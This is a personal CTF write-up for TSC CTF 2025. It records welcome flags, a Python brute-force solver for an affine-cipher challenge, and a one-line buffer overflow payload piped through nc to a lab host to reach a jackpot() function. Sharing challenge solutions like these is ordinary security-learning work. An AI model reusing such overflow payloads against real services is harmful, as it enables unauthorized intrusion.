# TSC CTF Individual 2025
CTFTime : https://ctftime.org/event/2598/

Date : Mon, 13 Jan. 2025, 09:00 UTC+7 — Thu, 16 Jan. 2025, 09:00 UTC+7

> [!NOTE]
> Capturing the flag solo as **_zenCipher_** 

<details>
    <summary><b>Table of contents</b></summary>

1. [Welcome](#-welcome)
   - [Free flag](#free-flag)
   - [Discord](#discord)
2. [Crypto](#-crypto)
   - [classic](#classic)
   <!-- - [very simple login](#very-simple-login) -->
3. [Pwn]()
   - [gamble_bad_bad](#gamble_bad_bad)
</details>

# 👋 Welcome
## Free flag
Just select all of the text, 
[gambar desc]
**Flag :**
```flag
TSC{W3llc0me_t0_TSC2O2SIlIllI}
```

## Discord
[gambar desc]
Just enter to TSC's discord and explore it
```flag
TSC{w31c0m3_t0_t5cc7f2025_d15c0rd!!!}
```


# 🔏 Crypto
## classic
[gambar desc]

**Attachment file :** [share.tgz](./share.tgz)

So, basically, it's just a [Affine Cipher](https://en.wikipedia.org/wiki/Affine_cipher) chall. It will do transformation and do this aritmetic operation to get the cipher text. `C = (A × P + B) mod N`.
We can use the formula to get the plain text. The formula is `P=(C−B)×A 
−1 mod N`. So, use this script to solve it.

```python
import string

# Charset used in encryption
charset = string.digits + string.ascii_letters + string.punctuation

# Encrypted string (ciphertext)
encrypted_string = "o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"

# Length of the charset
charset_length = len(charset)

# Function to decrypt using guessed A and B
def decrypt(encrypted_string, A, B, charset):
    mod_inverse_A = pow(A, -1, len(charset))
    decrypted = ""
    for c in encrypted_string:
        original_index = (charset.find(c) - B) * mod_inverse_A % len(charset)
        decrypted += charset[original_index]
    return decrypted

# Brute-force A and B
for A in range(2**16):  # Limiting the range for practicality; adjust as needed
    for B in range(2**16):
        try:
            decrypted_flag = decrypt(encrypted_string, A, B, charset)
            if decrypted_flag.startswith("TSC{"):  # Check for the correct flag format
                print(f"Found A: {A}, B: {B}")
                print("Decrypted flag:", decrypted_flag)
                break
        except ValueError:
            continue

```

**Flag :**
```flag
TSC{c14551c5_c1ph3r5_4r5_fr4g17e}
```

<!-- ## very simple login
[gambar desc]

**Flag :**
```flag
TSC{Wr0nG_HM4C_7O_L3A_!!!}
``` -->

# 💻 Pwn
## gamble_bad_bad
[gambar desc]

**Attachment file :** [main.cpp](./main.cpp)

Because the `game.jackpot_value` gets input user only takes 20 bytes of buffer. So, we can overflow it to get into **jackpot()** function using this payload
```sh
AAAAAAAAAAAAAAAAAAAA777 | nc 172.31.0.2 1337
```

**Flag :**
```flag
TSC{Gamb1e_Very_bad_bad_but_}
```

<br><br>

========================================================

Thanks for read this writeup. If u wanna support me, buy me a coffee [here](https://ko-fi.com/abiabdillah) or click button below

[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/abiabdillah) [![Ko-Fi](https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/abiabdillah)